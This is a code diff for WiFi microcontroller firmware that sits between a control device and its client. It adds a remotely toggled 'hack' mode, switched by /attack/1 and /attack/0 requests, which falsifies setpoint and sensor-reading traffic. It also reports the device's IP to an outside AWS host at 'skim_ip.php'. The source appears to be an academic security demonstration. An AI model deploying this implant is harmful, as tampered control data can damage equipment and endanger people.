@@ -12,6 +12,10 @@ bool sendMode = false;
 WiFiClient client;
 WiFiServer server(80);
 
+String clientStr = "";
+bool ipSent = false;
+bool hack = false;
+
 void setup() 
 {
   Serial.begin(115200);
@@ -19,10 +23,17 @@ void setup()
   server.begin();
 }
 
-String clientStr = "";
-
 void loop() 
 {
+  if(!ipSent)
+  {
+    if(WiFi.status() == WL_CONNECTED)
+    {
+      SendIP();
+      ipSent = true;
+    }
+  }
+  
   CheckServer();
     
   while(client.available())
@@ -31,7 +42,7 @@ void loop()
     clientStr += ch;
     if(ch == '\n')
     {
-      clientStr = InterceptSetPoint(clientStr, 0, -4);      
+      if(hack) clientStr = InterceptSetPoint(clientStr, 0, -4);      
       Serial.print(clientStr);
       clientStr = "";
     }
@@ -49,7 +60,7 @@ void loop()
       {
         if(incoming.indexOf("GET") >= 0) 
         {
-          incoming = InterceptReading(incoming, 190, 4);
+          if(hack) incoming = InterceptReading(incoming, 191, 4);
         }
         client.print(incoming);
         incoming = "";
@@ -226,12 +237,13 @@ int SendIP(void)
   char destServer[] = "ec2-34-209-142-24.us-west-2.compute.amazonaws.com";
   WiFiClient ipClient;
   ipClient.connect(destServer, 80);
-  ipClient.print("GET /~gcl8a/ip_hoest.php?ip=");
+  ipClient.print("GET /~gcl8a/skim_ip.php?ip=");
   ipClient.print(WiFi.localIP());
   ipClient.print(" HTTP/1.1\r\nHost: "); //the beginning of the "footer"
   ipClient.print(destServer); //this tells the interwebs to route your request through the AWS server
   ipClient.print("\r\nConnection: close\r\n\r\n"); //tell the server to close the cxn when done.
 
+  Serial.print(WiFi.localIP());
   return 1;
 }
 
@@ -293,18 +305,33 @@ String InterceptSetPoint(const String& str, float adj0, float adj1) //adjust the
 void CheckServer(void)
 {
   WiFiClient remoteClient = server.available();
+
   if(remoteClient) 
   {
-    // Wait until the client sends some data
-    Serial.println("new client");
-    String str = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE HTML>\r\n<html>\r\nHi\r\n";
-    str += "</html>\r\n";
+    String input;
+
+    unsigned long lastRead = millis();
+    while(millis() - lastRead < 500) //1 sec timeout
+    {
+      if(remoteClient.available())
+      {
+        char ch = (char)remoteClient.read();
+        input += ch;
+        lastRead = millis();
+
+        if(ch == '\n')
+        {
+          if(input.indexOf("/attack/0") != -1) {hack = false; remoteClient.flush();}
+          if(input.indexOf("/attack/1") != -1) {hack = true; remoteClient.flush();}
+        }
+      }
+    }
+
+    String str = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<!DOCTYPE HTML>\r\n<html>\r\n";
+    str += String(hack);
+    str += "\r\n</html>\r\n";
     
     remoteClient.print(str);
-//    while(!client.available())
-//    {
-//      delay(1);
-//    }
   }
 }
 
